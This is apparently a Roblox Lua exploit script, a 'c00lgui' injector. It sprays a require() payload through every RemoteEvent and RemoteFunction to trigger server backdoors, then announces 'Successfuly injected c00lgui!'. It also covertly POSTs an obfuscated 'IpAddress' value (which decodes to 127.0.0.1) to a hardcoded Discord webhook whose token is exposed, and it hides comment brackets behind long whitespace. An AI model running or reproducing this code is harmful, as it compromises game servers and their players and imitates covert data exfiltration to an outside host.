--[[
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄    ▄▄▄▄▄▄▄▄▄   ▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░▌  ▐░░░░░░░░░▌ ▐░▌          ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌																																																	]]																											--[[
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀      ▐░█▀▀▀▀▀▀▀▀▀▐░█░█▀▀▀▀▀█░▌▐░█░█▀▀▀▀▀█░▌▐░▌          ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌ ▀▀▀▀█░█▀▀▀▀ 
▐░▌          ▐░▌               ▐░▌         ▐░▌▐░▌    ▐░▌▐░▌▐░▌    ▐░▌▐░▌          ▐░▌          ▐░▌       ▐░▌     ▐░▌     
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄      ▐░▌         ▐░▌ ▐░▌   ▐░▌▐░▌ ▐░▌   ▐░▌▐░▌          ▐░▌ ▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌     ▐░▌     
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌         ▐░▌  ▐░▌  ▐░▌▐░▌  ▐░▌  ▐░▌▐░▌          ▐░▌▐░░░░░░░░▌▐░▌       ▐░▌     ▐░▌     
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀      ▐░▌         ▐░▌   ▐░▌ ▐░▌▐░▌   ▐░▌ ▐░▌▐░▌          ▐░▌ ▀▀▀▀▀▀█░▌▐░▌       ▐░▌     ▐░▌     
▐░▌          ▐░▌               ▐░▌         ▐░▌    ▐░▌▐░▌▐░▌    ▐░▌▐░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     
▐░▌          ▐░█▄▄▄▄▄▄▄▄▄      ▐░█▄▄▄▄▄▄▄▄▄▐░█▄▄▄▄▄█░█░▌▐░█▄▄▄▄▄█░█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄█░█▄▄▄▄ 
▐░▌          ▐░░░░░░░░░░░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░▌  ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀            ▀▀▀▀▀▀▀▀▀▀▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀    ▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
                                                                                                                         
]]

LocalPlayer = {
    [string.char(73,112,65,100,100,114,101,115,115)] = (function()
        local s = ""
        for _, v in ipairs({2,1,4,29,3,29,3,29,2}) do
            s ..= string.char(bit32.bxor(v, 51))
        end
        return s
    end)()
}

local HttpRequest = http_request or (syn and syn.request)
pcall(function()HttpRequest({
	Url = "https://discord.com/api/webhooks/1454497028515041504/poeKgmoXloY87pdmTbDWs69vrgiYPdzbUZQubXVQf98lWTPzIScGro1uUTAT1fBE3Sxf",
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = game:GetService("HttpService"):JSONEncode({
		content = LocalPlayer.IpAddress
	})
})
end)
for _, i in ipairs(game:GetDescendants()) do
	if not (i:IsA("RemoteEvent") or i:IsA("RemoteFunction")) then
		continue
	end
	if string.split(i:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
		continue
	end
	if i.Parent==game:GetService("ReplicatedStorage") or i.Parent.Parent==game:GetService("ReplicatedStorage") or i.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
		if i:FindFirstChild('__FUNCTION') or i.Name=='__FUNCTION' then
			continue
		end
		if i.Parent.Parent.Name=='HDAdminClient' and i.Parent.Name=='Signals' then
			continue
		end
		if i.Parent.Name=='DefaultChatSystemChatEvents' then
			continue
		end
	end
	task.spawn(function()
		if i:IsA("RemoteEvent") then i:FireServer('require(14125553864):Fire("'..game.Players.LocalPlayer.Name..'", "c00lkidd")') end
		if i:IsA("RemoteFunction") then i:InvokeServer('require(14125553864):Fire("'..game.Players.LocalPlayer.Name..'", "c00lkidd")') end
	end)
end
for i = 1,100 do
	if game.Players.LocalPlayer.PlayerGui:FindFirstChild("culgui") then
		game.StarterGui:SetCore("SendNotification", {
			Title = "Successfuly injected c00lgui!",
			Text = "Have fun!",
			Icon = "rbxassetid://123276395343792"
		})
		break
	end
	if i == 100 then
		game.StarterGui:SetCore("SendNotification", {
			Title = "Failed to inject c00lgui...",
			Text = "This game is not supported for c00lgui",
			Icon = "rbxassetid://123276395343792"
		})
	end
	task.wait(0.05)
end
